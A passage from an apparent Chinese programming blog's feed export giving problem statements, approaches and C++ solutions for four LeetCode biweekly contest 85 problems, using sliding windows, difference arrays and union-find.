&#125;</span><br><span class="line">            curr = <span class="built_in">max</span>(curr, sum[<span class="built_in">find</span>(fa, x)]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>欢迎关注和打赏，感谢支持！</p>
<ul>
<li>关注我的博客: <a href="http://mikemeng.org/">http://mikemeng.org/</a></li>
<li>关注我的知乎：<a href="https://www.zhihu.com/people/da-hua-niu">https://www.zhihu.com/people/da-hua-niu</a></li>
<li>关注我的微信公众号: 公务程序猿<br><img src="https://i.loli.net/2020/11/16/xtyDOgT6Gm1AKdS.png" alt="1"></li>
</ul>
]]></content>
      <categories>
        <category>力扣周赛</category>
      </categories>
      <tags>
        <tag>力扣周赛</tag>
      </tags>
  </entry>
  <entry>
    <title>leetcode  biweekly contest 85</title>
    <url>/2022/11/01/%E5%8A%9B%E6%89%A3%E5%91%A8%E8%B5%9B%E9%A2%98%E8%A7%A3/26/</url>
    <content><![CDATA[<h2 id="leetcode-biweekly-contest-85"><a href="#leetcode-biweekly-contest-85" class="headerlink" title="leetcode  biweekly contest 85"></a>leetcode  biweekly contest 85</h2><p>双周赛的质量又好起来了，前几周的题目质量水平下降严重，本周开始质量好很多了。</p>
<h4 id="6156-得到-K-个黑块的最少涂色次数"><a href="#6156-得到-K-个黑块的最少涂色次数" class="headerlink" title="6156. 得到 K 个黑块的最少涂色次数"></a><a href="https://leetcode.cn/problems/minimum-recolors-to-get-k-consecutive-black-blocks/">6156. 得到 K 个黑块的最少涂色次数</a></h4><h4 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h4><p>给你一个长度为 <code>n</code> 下标从 <code>0</code> 开始的字符串 <code>blocks</code> ，<code>blocks[i]</code> 要么是 <code>&#39;W&#39; </code>要么是<code> &#39;B&#39;</code> ，表示第<code>i</code>块的颜色。字符<code>&#39;W&#39;</code>和<code>&#39;B&#39;</code>分别表示白色和黑色。</p>
<p>给你一个整数 <code>k </code>，表示想要 连续 黑色块的数目。</p>
<p>每一次操作中，你可以选择一个白色块将它 涂成 黑色块。</p>
<p>请你返回至少出现 一次 连续 <code>k</code> 个黑色块的 最少 操作次数。</p>
<p>示例 1：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：blocks = &quot;WBBWWBBWBW&quot;, k = 7</span><br><span class="line">输出：3</span><br><span class="line">解释：</span><br><span class="line">一种得到 7 个连续黑色块的方法是把第 0 ，3 和 4 个块涂成黑色。</span><br><span class="line">得到 blocks = &quot;BBBBBBBWBW&quot; 。</span><br><span class="line">可以证明无法用少于 3 次操作得到 7 个连续的黑块。</span><br><span class="line">所以我们返回 3 。</span><br></pre></td></tr></table></figure>



<p>示例 2：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：blocks = &quot;WBWBBBW&quot;, k = 2</span><br><span class="line">输出：0</span><br><span class="line">解释：</span><br><span class="line">不需要任何操作，因为已经有 2 个连续的黑块。</span><br><span class="line">所以我们返回 0 。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">提示：</span><br><span class="line"></span><br><span class="line">n == blocks.length</span><br><span class="line">1 &lt;= n &lt;= 100</span><br><span class="line">blocks[i] 要么是 &#x27;W&#x27; ，要么是 &#x27;B&#x27; 。</span><br><span class="line">1 &lt;= k &lt;= n</span><br></pre></td></tr></table></figure>




<p>提示：</p>
<ul>
<li><code>n == blocks.length</code></li>
<li><code>1 &lt;= n &lt;= 100</code></li>
<li><code>blocks[i] </code>要么是 <code>&#39;W&#39;</code> ，要么是 <code>&#39;B&#39; </code>。</li>
<li><code>1 &lt;= k &lt;= n</code></li>
</ul>
<h4 id="地址"><a href="#地址" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/problems/minimum-recolors-to-get-k-consecutive-black-blocks">https://leetcode.cn/problems/minimum-recolors-to-get-k-consecutive-black-blocks</a></p>
<h4 id="题意"><a href="#题意" class="headerlink" title="题意"></a>题意</h4><pre><code>滑动窗口
</code></pre>
<h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><ol>
<li>直接采用滑动窗口找到 $k$ 个长度 中黑色方块 ，找到连续的 $k$ 个长度中白色块最少的即可。</li>
<li>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：$O(n)$，其中  $n$ 表示字符串的长度。</li>
<li>空间复杂度：$O(1)$。</li>
</ul>
<h4 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h4><ul>
<li>滑动窗口<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">minimumRecolors</span><span class="params">(string blocks, <span class="type">int</span> k)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n = blocks.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> ans = n;</span><br><span class="line">        <span class="type">int</span> whiteCnt = <span class="number">0</span>, blackCnt = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (blocks[i] == <span class="string">&#x27;W&#x27;</span>) &#123;</span><br><span class="line">                whiteCnt++;</span><br><span class="line">            &#125; </span><br><span class="line">            <span class="keyword">if</span> (i &gt;= k - <span class="number">1</span>) &#123;</span><br><span class="line">                ans = <span class="built_in">min</span>(ans, whiteCnt);</span><br><span class="line">                <span class="keyword">if</span> (blocks[i - k + <span class="number">1</span>] == <span class="string">&#x27;W&#x27;</span>) &#123;</span><br><span class="line">                    whiteCnt--;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="6157-二进制字符串重新安排顺序需要的时间"><a href="#6157-二进制字符串重新安排顺序需要的时间" class="headerlink" title="6157. 二进制字符串重新安排顺序需要的时间"></a><a href="https://leetcode.cn/problems/time-needed-to-rearrange-a-binary-string/">6157. 二进制字符串重新安排顺序需要的时间</a></h3><h4 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h4><p>给你一个二进制字符串 <code>s</code> 。在一秒之中，所有 子字符串 <code>&quot;01&quot;</code> 同时 被替换成 <code>&quot;10&quot;</code> 。这个过程持续进行到没有 <code>&quot;01&quot; </code>存在。</p>
<p>请你返回完成这个过程所需要的秒数。</p>
<p>示例 1：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：s = &quot;0110101&quot;</span><br><span class="line">输出：4</span><br><span class="line">解释：</span><br><span class="line">一秒后，s 变成 &quot;1011010&quot; 。</span><br><span class="line">再过 1 秒后，s 变成 &quot;1101100&quot; 。</span><br><span class="line">第三秒过后，s 变成 &quot;1110100&quot; 。</span><br><span class="line">第四秒后，s 变成 &quot;1111000&quot; 。</span><br><span class="line">此时没有 &quot;01&quot; 存在，整个过程花费 4 秒。</span><br><span class="line">所以我们返回 4 。</span><br></pre></td></tr></table></figure>

<p>示例 2：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：s = &quot;11100&quot;</span><br><span class="line">输出：0</span><br><span class="line">解释：</span><br><span class="line">s 中没有 &quot;01&quot; 存在，整个过程花费 0 秒。</span><br><span class="line">所以我们返回 0 。</span><br></pre></td></tr></table></figure>


<p>提示：</p>
<ul>
<li><code>1 &lt;= s.length &lt;= 1000</code></li>
<li><code>s[i] </code>要么是<code>&#39;0&#39;</code>，要么是<code> &#39;1&#39;</code> 。</li>
</ul>
<h4 id="地址-1"><a href="#地址-1" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/problems/time-needed-to-rearrange-a-binary-string">https://leetcode.cn/problems/time-needed-to-rearrange-a-binary-string</a></p>
<h4 id="题意-1"><a href="#题意-1" class="headerlink" title="题意"></a>题意</h4><pre><code>直接模拟或者思维
</code></pre>
<h4 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h4><ol>
<li>直接模拟就非常简单，我们可以观察到直接模拟的时间复杂度不超过 $n^2$，因此我们可以直接模拟即可，知道字符串中没有字符串 <code>01</code> 出现即可。</li>
<li>动态规划，本质上讲右侧的 $1$ 往左侧移动，如果 $1$  前面有连续的 $0$ ,则可以讲其一直向左移动直到左侧为  $1$  为止，此时需要等待。</li>
<li>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：时间复杂度为 $O(n)$，$n$ 表示节点的数目。</li>
<li>空间复杂度：$O(n)$，$n$ 表示节点的数目。</li>
</ul>
<h4 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h4><ul>
<li>直接模拟：</li>
</ul>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">secondsToRemoveOccurrences</span><span class="params">(string s)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n = s.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> ans = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(<span class="literal">true</span>) &#123;</span><br><span class="line">            <span class="type">bool</span> valid = <span class="literal">false</span>;</span><br><span class="line">            <span class="type">int</span> pos = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">while</span>(pos &lt; n - <span class="number">1</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span>(s[pos] == <span class="string">&#x27;0&#x27;</span> &amp;&amp; s[pos + <span class="number">1</span>] == <span class="string">&#x27;1&#x27;</span>) &#123;</span><br><span class="line">                    s[pos] = <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">                    s[pos + <span class="number">1</span>] = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">                    pos += <span class="number">2</span>;</span><br><span class="line">                    valid = <span class="literal">true</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    pos++;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(valid)&#123;</span><br><span class="line">                ans++;</span><br><span class="line">            &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<ul>
<li><p>动态规划：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">secondsToRemoveOccurrences</span><span class="params">(string s)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n = s.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> ans = <span class="number">0</span>, cnt = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span>(s[i] == <span class="string">&#x27;0&#x27;</span>) &#123;</span><br><span class="line">                ++cnt;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (cnt &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                    ans = <span class="built_in">max</span>(ans + <span class="number">1</span>, cnt);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="6158-字母移位-II"><a href="#6158-字母移位-II" class="headerlink" title="6158. 字母移位 II"></a>6158. 字母移位 II</h3><h4 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h4><p>给你一个小写英文字母组成的字符串 <code>s</code> 和一个二维整数数组 <code>shifts</code> ，其中 <code>shifts[i] = [starti, endi, directioni]</code> 。对于每个 <code>i</code> ，将 <code>s</code> 中从下标 <code>starti</code> 到下标 <code>endi</code> （两者都包含）所有字符都进行移位运算，如果 <code>directioni = 1</code> 将字符向后移位，如果 <code>directioni = 0</code> 将字符向前移位。</p>
<p>将一个字符 <strong>向后</strong> 移位的意思是将这个字符用字母表中 <strong>下一个</strong> 字母替换（字母表视为环绕的，所以 <code>&#39;z&#39;</code> 变成 <code>&#39;a&#39;</code>）。类似的，将一个字符 <strong>向前</strong> 移位的意思是将这个字符用字母表中 <strong>前一个</strong> 字母替换（字母表是环绕的，所以 <code>&#39;a&#39;</code> 变成 <code>&#39;z&#39;</code> ）。</p>
<p>请你返回对 <code>s</code> 进行所有移位操作以后得到的最终字符串。</p>
<p><strong>示例 1：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：s = &quot;abc&quot;, shifts = [[0,1,0],[1,2,1],[0,2,1]]</span><br><span class="line">输出：&quot;ace&quot;</span><br><span class="line">解释：首先，将下标从 0 到 1 的字母向前移位，得到 s = &quot;zac&quot; 。</span><br><span class="line">然后，将下标从 1 到 2 的字母向后移位，得到 s = &quot;zbd&quot; 。</span><br><span class="line">最后，将下标从 0 到 2 的字符向后移位，得到 s = &quot;ace&quot; 。</span><br></pre></td></tr></table></figure>

<p><strong>示例 2:</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：s = &quot;dztz&quot;, shifts = [[0,0,0],[1,1,1]]</span><br><span class="line">输出：&quot;catz&quot;</span><br><span class="line">解释：首先，将下标从 0 到 0 的字母向前移位，得到 s = &quot;cztz&quot; 。</span><br><span class="line">最后，将下标从 1 到 1 的字符向后移位，得到 s = &quot;catz&quot; 。</span><br></pre></td></tr></table></figure>

<p><strong>提示：</strong></p>
<ul>
<li><code>1 &lt;= s.length, shifts.length &lt;= 5 * 104</code></li>
<li><code>shifts[i].length == 3</code></li>
<li><code>0 &lt;= starti &lt;= endi &lt; s.length</code></li>
<li><code>0 &lt;= directioni &lt;= 1</code></li>
<li><code>s</code> 只包含小写英文字母。</li>
</ul>
<h4 id="地址-2"><a href="#地址-2" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/contest/biweekly-contest-85/problems/shifting-letters-ii/">https://leetcode.cn/contest/biweekly-contest-85/problems/shifting-letters-ii/</a></p>
<h4 id="题意-2"><a href="#题意-2" class="headerlink" title="题意"></a>题意</h4><pre><code>差分数组或者线段树
</code></pre>
<h4 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h4><ol>
<li>线段树的解法就非常暴力，没啥好讲的，需要 <code>lazy</code> 节点之类的，比较麻烦。查分数组的思路就非常简单，直接讲每个区间 $[l,r]$ ,在 $l，r+1$ 处进行进行标记即可，统计时依次统计即可。</li>
</ol>
<ul>
<li>时间复杂度：时间复杂度为 $O(m + n)$，其中  $m$ 为 $shift$ 数组的长度，$n$ 为字符串的长度。</li>
<li>空间复杂度：空间复杂度为 $O(n)$，其中 $n$ 表示字符串的长度。</li>
</ul>
<h4 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">string <span class="title">shiftingLetters</span><span class="params">(string s, vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; shifts)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n = s.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> m = shifts.<span class="built_in">size</span>();</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">cnt</span><span class="params">(n + <span class="number">1</span>, <span class="number">0</span>)</span></span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; m; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (shifts[i][<span class="number">2</span>] == <span class="number">0</span>) &#123;</span><br><span class="line">                cnt[shifts[i][<span class="number">0</span>]]--;</span><br><span class="line">                cnt[shifts[i][<span class="number">1</span>] + <span class="number">1</span>]++;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                cnt[shifts[i][<span class="number">0</span>]]++;</span><br><span class="line">                cnt[shifts[i][<span class="number">1</span>] + <span class="number">1</span>]--;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> curr = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            curr += cnt[i];</span><br><span class="line">            s[i] = <span class="string">&#x27;a&#x27;</span> + (s[i] - <span class="string">&#x27;a&#x27;</span> + curr%<span class="number">26</span> + <span class="number">26</span>)%<span class="number">26</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> s;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>


<h3 id="6159-删除操作后的最大子段和"><a href="#6159-删除操作后的最大子段和" class="headerlink" title="6159. 删除操作后的最大子段和"></a>6159. 删除操作后的最大子段和</h3><h4 id="题目-3"><a href="#题目-3" class="headerlink" title="题目"></a>题目</h4><p>给你两个下标从 <strong>0</strong> 开始的整数数组 <code>nums</code> 和 <code>removeQueries</code> ，两者长度都为 <code>n</code> 。对于第 <code>i</code> 个查询，<code>nums</code> 中位于下标 <code>removeQueries[i]</code> 处的元素被删除，将 <code>nums</code> 分割成更小的子段。</p>
<p>一个 <strong>子段</strong> 是 <code>nums</code> 中连续 <strong>正</strong> 整数形成的序列。<strong>子段和</strong> 是子段中所有元素的和。</p>
<p>请你返回一个长度为 <code>n</code> 的整数数组 <code>answer</code> ，其中 <code>answer[i]</code>是第 <code>i</code> 次删除操作以后的 <strong>最大</strong> 子段和。</p>
<p><strong>注意：</strong>一个下标至多只会被删除一次。</p>
<p><strong>示例 1：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：nums = [1,2,5,6,1], removeQueries = [0,3,2,4,1]</span><br><span class="line">输出：[14,7,2,2,0]</span><br><span class="line">解释：用 0 表示被删除的元素，答案如下所示：</span><br><span class="line">查询 1 ：删除第 0 个元素，nums 变成 [0,2,5,6,1] ，最大子段和为子段 [2,5,6,1] 的和 14 。</span><br><span class="line">查询 2 ：删除第 3 个元素，nums 变成 [0,2,5,0,1] ，最大子段和为子段 [2,5] 的和 7 。</span><br><span class="line">查询 3 ：删除第 2 个元素，nums 变成 [0,2,0,0,1] ，最大子段和为子段 [2] 的和 2 。</span><br><span class="line">查询 4 ：删除第 4 个元素，nums 变成 [0,2,0,0,0] ，最大子段和为子段 [2] 的和 2 。</span><br><span class="line">查询 5 ：删除第 1 个元素，nums 变成 [0,0,0,0,0] ，最大子段和为 0 ，因为没有任何子段存在。</span><br><span class="line">所以，我们返回 [14,7,2,2,0] 。</span><br></pre></td></tr></table></figure>

<p><strong>示例 2：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：nums = [3,2,11,1], removeQueries = [3,2,1,0]</span><br><span class="line">输出：[16,5,3,0]</span><br><span class="line">解释：用 0 表示被删除的元素，答案如下所示：</span><br><span class="line">查询 1 ：删除第 3 个元素，nums 变成 [3,2,11,0] ，最大子段和为子段 [3,2,11] 的和 16 。</span><br><span class="line">查询 2 ：删除第 2 个元素，nums 变成 [3,2,0,0] ，最大子段和为子段 [3,2] 的和 5 。</span><br><span class="line">查询 3 ：删除第 1 个元素，nums 变成 [3,0,0,0] ，最大子段和为子段 [3] 的和 3 。</span><br><span class="line">查询 5 ：删除第 0 个元素，nums 变成 [0,0,0,0] ，最大子段和为 0 ，因为没有任何子段存在。</span><br><span class="line">所以，我们返回 [16,5,3,0] 。</span><br></pre></td></tr></table></figure>

<p><strong>提示：</strong></p>
<ul>
<li><code>n == nums.length == removeQueries.length</code></li>
<li><code>1 &lt;= n &lt;= 105</code></li>
<li><code>1 &lt;= nums[i] &lt;= 109</code></li>
<li><code>0 &lt;= removeQueries[i] &lt; n</code></li>
<li><code>removeQueries</code> 中所有数字 <strong>互不相同</strong> 。</li>
</ul>
<h4 id="地址-3"><a href="#地址-3" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/contest/biweekly-contest-85/problems/maximum-segment-sum-after-removals/">https://leetcode.cn/contest/biweekly-contest-85/problems/maximum-segment-sum-after-removals/</a></p>
<h4 id="题意-3"><a href="#题意-3" class="headerlink" title="题意"></a>题意</h4><pre><code>二分查找或者并查集
</code></pre>
<h4 id="思路-3"><a href="#思路-3" class="headerlink" title="思路"></a>思路</h4><ol>
<li>直接模拟的思路非常简单，也非常暴力。直接按照题目思路要求，每次将分段进行拆分即可。我们用一个 <code>treemap</code>  保存所有的分段信息，用一个 <code>treemap</code> 保存当前所有数组的中的分段和的统计。每次我们在 <code>treemap</code> 中查找给定的区间 $[x,x]$ 匹配的分段 $[l,r]$ ，然后将分段拆分成 $[l,x-1],[x+1,r]$ ,并从 <code>map</code> 中删除分段 $[l,r]$, 在  <code>treemap</code> 删除 $sum[l,r]$, 并同时添加 $sum[l,x-1], sum[x+1,r]$, 非常简单的模拟即可。</li>
</ol>
<ul>
<li><p>时间复杂度：$O(m \log m)$，其中 $m$ 表示数组的长度。</p>
</li>
<li><p>空间复杂度：$O(m)$，其中 $m$ 表示数组的长度。</p>
</li>
</ul>
<ol start="2">
<li>典型的并查集的操作。我们从后往前恢复数组，就可以看到实际为该数组的恢复过程，此时就联想到用并查集，思路非常简单，感觉是个经典题目，虽然不是特别难的题目。每次恢复 $x$ 时：</li>
</ol>
<ul>
<li>查看 $x$ 的左边位置 $x-1$ 是否已经恢复，如果已经恢复，则将两个位置进行合并；</li>
<li>查看 $x$ 的右边位置 $x+1$ 是否已经恢复，如果已经恢复，则将两个位置进行合并；</li>
<li>每次查询集合 $x$ 所在的集合的元素的和，更新当前的最大值即可；</li>
</ul>
<p>时间复杂度分析：</p>
<ul>
<li>时间复杂度：$O(n \times \alpha(n))$，其中 $n$ 表示数组的长度。</li>
<li>空间复杂度：$O(n)$，其中 $n$ 表示数组的长度。</li>
</ul>
<h4 id="代码-3"><a href="#代码-3" class="headerlink" title="代码"></a>代码</h4><ul>
<li>二分查找<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="type">long</span> <span class="type">long</span>&gt; <span class="title">maximumSegmentSum</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums, vector&lt;<span class="type">int</span>&gt;&amp; removeQueries)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="function">vector&lt;<span class="type">long</span> <span class="type">long</span>&gt; <span class="title">sum</span><span class="params">(n + <span class="number">1</span>)</span></span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            sum[i+<span class="number">1</span>] = sum[i] + nums[i];</span><br><span class="line">        &#125;</span><br><span class="line">        map&lt;pair&lt;<span class="type">int</span>,<span class="type">int</span>&gt;, <span class="type">long</span> <span class="type">long</span>&gt; cnt;</span><br><span class="line">        map&lt;<span class="type">long</span> <span class="type">long</span>, <span class="type">int</span>&gt; now;</span><br><span class="line">        cnt[<span class="built_in">make_pair</span>(n<span class="number">-1</span>, <span class="number">0</span>)] = sum[n];</span><br><span class="line">        now[sum[n]]++;</span><br><span class="line">        <span class="type">int</span> m = removeQueries.<span class="built_in">size</span>();</span><br><span class="line">        <span class="function">vector&lt;<span class="type">long</span> <span class="type">long</span>&gt; <span class="title">ans</span><span class="params">(m)</span></span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; m - <span class="number">1</span>; i++) &#123;</span><br><span class="line">            <span class="type">int</span> x = removeQueries[i];</span><br><span class="line">            <span class="keyword">auto</span> it = cnt.<span class="built_in">lower_bound</span>(&#123;x,<span class="number">0</span>&#125;);</span><br><span class="line">            <span class="type">int</span> r = it-&gt;first.first;</span><br><span class="line">            <span class="type">int</span> l = it-&gt;first.second;</span><br><span class="line">            <span class="type">long</span> <span class="type">long</span> s = it-&gt;second;</span><br><span class="line">            cnt.<span class="built_in">erase</span>(it);</span><br><span class="line">            now[s]--;</span><br><span class="line">            <span class="keyword">if</span>(now[s] == <span class="number">0</span>) &#123;</span><br><span class="line">                now.<span class="built_in">erase</span>(s);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (x &gt; l) &#123;</span><br><span class="line">                cnt[<span class="built_in">make_pair</span>(x - <span class="number">1</span>, l)] = sum[x] - sum[l];</span><br><span class="line">                now[sum[x] - sum[l]]++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (x &lt; r) &#123;</span><br><span class="line">                cnt[<span class="built_in">make_pair</span>(r, x + <span class="number">1</span>)] = sum[r+<span class="number">1</span>] - sum[x+<span class="number">1</span>];</span><br><span class="line">                now[sum[r+<span class="number">1</span>] - sum[x+<span class="number">1</span>]]++;</span><br><span class="line">            &#125;</span><br><span class="line">            ans[i] = now.<span class="built_in">rbegin</span>()-&gt;first;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li>
<li>并查集<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">find</span><span class="params">(vector&lt;<span class="type">int</span>&gt; &amp;f, <span class="type">int</span> x)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">while</span> (x != f[x]) &#123;</span><br><span class="line">            x = f[x];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> x;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">uni</span><span class="params">(vector&lt;<span class="type">int</span>&gt; &amp;f, vector&lt;<span class="type">long</span> <span class="type">long</span>&gt; &amp;sum, <span class="type">int</span> x, <span class="type">int</span> y)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> fx = <span class="built_in">find</span>(f, x);</span><br><span class="line">        <span class="type">int</span> fy = <span class="built_in">find</span>(f, y);</span><br><span class="line">        f[fx] = fy;</span><br><span class="line">        sum[fy] += sum[fx];</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function">vector&lt;<span class="type">long</span> <span class="type">long</span>&gt; <span class="title">maximumSegmentSum</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums, vector&lt;<span class="type">int</span>&gt;&amp; removeQueries)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">long</span> <span class="type">long</span> curr = <span class="number">0</span>;</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">fa</span><span class="params">(n, <span class="number">-1</span>)</span></span>;</span><br><span class="line">        <span class="function">vector&lt;<span class="type">long</span> <span class="type">long</span>&gt; <span class="title">sum</span><span class="params">(n, <span class="number">0</span>)</span></span>;</span><br><span class="line">        <span class="function">vector&lt;<span class="type">long</span> <span class="type">long</span>&gt; <span class="title">ans</span><span class="params">(n, <span class="number">0</span>)</span></span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = n - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">            ans[i] = curr;</span><br><span class="line">            <span class="type">int</span> x = removeQueries[i];</span><br><span class="line">            fa[x] = x;</span><br><span class="line">            sum[x] = nums[x];</span><br><span class="line">            <span class="keyword">if</span> (x - <span class="number">1</span> &gt;= <span class="number">0</span> &amp;&amp; fa[x - <span class="number">1</span>] &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="built_in">uni</span>(fa, sum, x, x - <span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (x + <span class="number">1</span> &lt; n &amp;&amp; fa[x + <span class="number">1</span>] &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="built_in">uni</span>(fa, sum, x, x + <span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            curr = <span class="built_in">max</span>(curr, sum[<span class="built_in">find</span>(fa, x)]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>欢迎关注和打赏，感谢支持！</p>
<ul>
<li>关注我的博客: <a href="http://mikemeng.org/">http://mikemeng.org/</a></li>
